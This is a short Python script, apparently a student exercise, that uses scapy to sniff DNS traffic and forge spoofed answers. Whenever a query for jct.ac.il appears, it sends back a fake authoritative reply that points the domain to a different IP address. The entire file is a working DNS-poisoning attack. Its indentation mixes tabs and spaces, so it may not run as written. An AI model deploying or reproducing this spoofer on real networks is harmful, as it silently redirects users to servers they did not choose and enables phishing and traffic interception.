import argparse
import threading
import getmac
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP, arping, getmacbyip


        
def send_dns_poisoned(pkt):
    print("checkpacket")
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  #dns and not answer
        print("dnsQuerychecked")
        if pkt.getlayer(DNS).qd.qname.decode() == "jct.ac.il.":
       	    print("GOTIT! JCT.AC.IL")
       	    
       	    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) 
       	    udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) 
       	    dns = DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd, aa=1,an=DNSRR(rrname=pkt[DNS].qd.qname, rdata="13.225.255.14"))   #changed ip to ramilevy's website  #fait answer keep same:id,querydomain
       	    
            fake_dns_answer =  ip/udp/dns
            send(fake_dns_answer, verbose=0)


if __name__ == "__main__":
 
    
   print("sniff")
   target=sniff(filter="port 53", prn=send_dns_poisoned)      #sniff port where dns packet flows out
 
    


